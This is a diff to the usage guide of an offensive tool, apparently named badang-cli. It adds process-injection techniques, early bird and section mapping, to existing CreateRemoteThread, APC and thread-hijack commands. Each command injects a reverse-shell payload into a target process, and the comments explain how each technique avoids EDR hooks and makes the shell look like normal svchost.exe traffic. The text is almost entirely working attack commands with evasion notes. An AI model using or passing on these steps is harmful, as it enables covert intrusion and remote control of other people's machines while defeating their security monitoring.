@@ -36,8 +36,12 @@ badang-cli syscall --func NtCreateThreadEx -x -c
 badang-cli inject --pid 1234 --technique createremote --payload rev.bin -x -c
 # Or: APC injection (queues to alertable threads, no new thread)
 badang-cli inject --pid 1234 --technique apc --payload rev.bin -x -c
-# Or: Thread hijack (redirects existing thread, hardest to detect)
+# Or: Thread hijack (redirects existing thread, no new thread or APC)
 badang-cli inject --pid 1234 --technique hijack --payload rev.bin -x -c
+# Or: Early bird (spawns suspended process, APC runs before EDR hooks)
+badang-cli inject --technique earlybird --payload rev.bin -x -c
+# Or: Section mapping (no WriteProcessMemory — uses shared memory)
+badang-cli inject --pid 1234 --technique section --payload rev.bin -x -c
 
 # Step 6: Reverse shell connects back from svchost.exe
 # Looks like normal system traffic to EDR and network monitors
